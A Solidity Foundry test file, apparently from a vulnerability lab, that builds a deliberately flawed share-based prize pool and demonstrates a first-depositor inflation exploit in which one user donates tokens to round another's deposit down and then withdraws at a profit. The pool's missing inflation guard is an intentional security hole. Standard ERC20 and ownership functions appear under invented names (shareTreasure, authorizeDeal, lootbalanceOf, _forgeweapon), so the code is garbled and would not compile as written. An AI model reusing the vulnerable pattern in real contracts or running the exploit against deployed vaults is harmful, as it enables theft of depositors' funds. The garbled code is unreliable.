// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    SimplePrizepool SimplePrizepoolContract;
    MyGoldtoken MyQuesttokenContract;

    function setUp() public {
        MyQuesttokenContract = new MyGoldtoken();
        SimplePrizepoolContract = new SimplePrizepool(address(MyQuesttokenContract));
    }

    function testFirstStoreloot() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        MyQuesttokenContract.shareTreasure(alice, 1 ether + 1);
        MyQuesttokenContract.shareTreasure(bob, 2 ether);

        vm.startPrank(alice);
        // Alice deposits 1 wei, gets 1 pool token
        MyQuesttokenContract.authorizeDeal(address(SimplePrizepoolContract), 1);
        SimplePrizepoolContract.bankGold(1);

        // Alice transfers 1 ether to the pool, inflating the pool token price
        MyQuesttokenContract.shareTreasure(address(SimplePrizepoolContract), 1 ether);

        vm.stopPrank();
        vm.startPrank(bob);
        // Bob deposits 2 ether, gets 1 pool token due to inflated price
        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.
        MyQuesttokenContract.authorizeDeal(address(SimplePrizepoolContract), 2 ether);
        SimplePrizepoolContract.bankGold(2 ether);
        vm.stopPrank();
        vm.startPrank(alice);

        MyQuesttokenContract.lootbalanceOf(address(SimplePrizepoolContract));

        // Alice withdraws and gets 1.5 ether, making a profit
        SimplePrizepoolContract.redeemGold(1);
        assertEq(MyQuesttokenContract.lootbalanceOf(alice), 1.5 ether);
        console.log("Alice balance", MyQuesttokenContract.lootbalanceOf(alice));
    }

    receive() external payable {}
}

contract MyGoldtoken is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _forgeweapon(msg.sender, 10000 * 10 ** decimals());
    }

    function createItem(address to, uint256 amount) public onlyGamemaster {
        _forgeweapon(to, amount);
    }
}

contract SimplePrizepool {
    IERC20 public loanGamecoin;
    uint public totalShares;

    mapping(address => uint) public lootbalanceOf;

    constructor(address _loanToken) {
        loanGamecoin = IERC20(_loanToken);
    }

    function bankGold(uint amount) external {
        require(amount > 0, "Amount must be greater than zero");

        uint _shares;
        if (totalShares == 0) {
            _shares = amount;
        } else {
            _shares = gamecoinToShares(
                amount,
                loanGamecoin.lootbalanceOf(address(this)),
                totalShares,
                false
            );
        }

        require(
            loanGamecoin.sendgoldFrom(msg.sender, address(this), amount),
            "TransferFrom failed"
        );
        lootbalanceOf[msg.sender] += _shares;
        totalShares += _shares;
    }

    function gamecoinToShares(
        uint _tokenAmount,
        uint _supplied,
        uint _sharesTotalSupply,
        bool roundUpCheck
    ) internal pure returns (uint) {
        if (_supplied == 0) return _tokenAmount;
        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;
        if (
            roundUpCheck &&
            shares * _supplied < _tokenAmount * _sharesTotalSupply
        ) shares++;
        return shares;
    }

    function redeemGold(uint shares) external {
        require(shares > 0, "Shares must be greater than zero");
        require(lootbalanceOf[msg.sender] >= shares, "Insufficient balance");

        uint goldtokenAmount = (shares * loanGamecoin.lootbalanceOf(address(this))) /
            totalShares;

        lootbalanceOf[msg.sender] -= shares;
        totalShares -= shares;

        require(loanGamecoin.shareTreasure(msg.sender, goldtokenAmount), "Transfer failed");
    }
}
